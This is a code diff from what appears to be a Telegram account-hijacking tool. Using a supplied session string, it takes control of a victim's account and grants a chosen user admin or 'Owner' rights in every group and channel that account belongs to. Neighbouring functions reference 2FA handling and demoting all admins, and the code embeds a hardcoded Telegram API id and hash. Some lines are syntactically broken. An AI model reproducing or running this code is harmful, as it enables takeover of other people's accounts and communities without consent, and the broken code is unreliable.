@@ -124,7 +124,7 @@ async def user2fa(strses):
             return False
 
 
-async def promote(strses, grp, user):
+async def gpromote(strses, user):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             rank = "@LegendBoy_XD"
@@ -134,18 +134,10 @@ async def promote(strses, grp, user):
                 for d in await X.get_dialogs()
                 if (d.is_group or d.is_channel)
             ]
-            rgt = add_admins=True,
-                invite_users=True,
-                change_info=True,
-                ban_users=True,
-                delete_messages=True,
-                pin_messages=True,
-                manage_call=True,
-            )
             for x in telchanel:
                 try:
                     await X.edit_admin(
-                        grp,
+                        x,
                         user,
                         manage_call=True,
                         invite_users=True,
@@ -157,15 +149,17 @@ async def promote(strses, grp, user):
                         delete_messages=True,
                         pin_messages=True,
                     )
-                    except:
-                        await X.edit_admin(
-                            grp,
-                            user,
-                            is_admin=True,
-                            anonymous=False,
-                            pin_messages=True,
-                            title="Owner",
-                        )
+                    i += 1
+                except:
+                    await X.edit_admin(
+                        x,
+                        user,
+                        is_admin=True,
+                        anonymous=False,
+                        pin_messages=True,
+                        title="Owner",
+                    )
+
 
 async def demall(strses, grp):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
